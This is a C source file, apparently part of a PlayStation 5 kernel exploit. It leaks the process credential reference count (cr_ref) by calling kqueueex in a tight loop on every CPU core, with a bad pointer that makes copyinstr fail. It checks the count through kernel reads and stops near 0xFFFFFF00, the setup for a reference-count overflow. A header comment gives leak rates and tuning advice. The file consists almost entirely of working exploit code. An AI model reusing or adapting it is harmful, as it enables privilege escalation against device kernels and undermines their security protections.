/*
 * Copyright (C) 2026 Gezine
 * This software may be modified and distributed under the terms of the MIT license.
 *
 *
 * What have i changed...
 *
 * Average leak rate: ~200k – 500k refs/sec per thread on PS5.
 * With 8 threads you can leak ~2–4 million refs/sec, reaching 0xFFFFFF00
 * from a typical initial value of ~0x1000 in under 30 minutes.
 * For a faster approach, pre-leak with a temporary thread pool before the
 * setuid/open phase.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <stdatomic.h>
#include <errno.h>
#include <ps5/kernel.h>

/* Syscall prototype */
int __sys_kqueueex(const char *name);

/* Global stop flag, shared by all leak threads */
static atomic_int g_stop = 0;

/* Target: stop leaking when cr_ref >= this value */
#define TARGET_REF  0xFFFFFF00

/* Polling interval (calls per check) */
#define POLL_EVERY  200000

typedef struct {
    unsigned long ucred_addr;
    unsigned int  thread_id;
} thread_arg_t;

static void *
leak_thread(void *arg_void) {
    thread_arg_t *targ = (thread_arg_t *)arg_void;
    unsigned long ucred = targ->ucred_addr;

    /* Use a local counter to avoid polluting the cache line with globals */
    unsigned int local_cnt = 0;

    while (!atomic_load(&g_stop)) {
        /* Tight syscall loop – the pointer must cause copyinstr() to fail */
        __sys_kqueueex((const char *)0x800000000000ULL);

        if (++local_cnt >= POLL_EVERY) {
            local_cnt = 0;

            unsigned int current_ref = 0;
            kernel_copyout(ucred, &current_ref, sizeof(current_ref));

            if (current_ref >= TARGET_REF) {
                atomic_store(&g_stop, 1);
                printf("[Thread %u] Reached target ref: 0x%x\n",
                       targ->thread_id, current_ref);
                break;
            }
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    /* Obtain process ucred address */
    unsigned long ucred = kernel_get_proc_ucred(getpid());
    if (!ucred) {
        printf("Failed to get ucred address\n");
        return 1;
    }

    /* Read initial reference count */
    unsigned int ref_before = 0;
    kernel_copyout(ucred, &ref_before, sizeof(ref_before));
    printf("[*] Initial cr_ref: 0x%x (%u)\n", ref_before, ref_before);
    if (ref_before >= TARGET_REF) {
        printf("[*] Already at target, no leak needed.\n");
        return 0;
    }

    /* Determine number of threads (all online CPU cores) */
    int ncpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 1) ncpus = 1;
    printf("[*] Using %d threads for leaking\n", ncpus);

    pthread_t *threads = calloc(ncpus, sizeof(pthread_t));
    thread_arg_t *targs = calloc(ncpus, sizeof(thread_arg_t));
    if (!threads || !targs) {
        printf("Memory allocation failed\n");
        return 1;
    }

    /* Create leak threads */
    for (int i = 0; i < ncpus; i++) {
        targs[i].ucred_addr = ucred;
        targs[i].thread_id  = i;
        if (pthread_create(&threads[i], NULL, leak_thread, &targs[i]) != 0) {
            printf("Failed to create thread %d\n", i);
            atomic_store(&g_stop, 1);  /* signal others to stop */
            break;
        }
    }

    /* Wait for all threads to finish */
    for (int i = 0; i < ncpus; i++) {
        if (threads[i])
            pthread_join(threads[i], NULL);
    }

    /* Final count verification */
    unsigned int ref_after = 0;
    kernel_copyout(ucred, &ref_after, sizeof(ref_after));
    printf("[*] Final cr_ref: 0x%x (%u)\n", ref_after, ref_after);

    free(threads);
    free(targs);
    return 0;
}
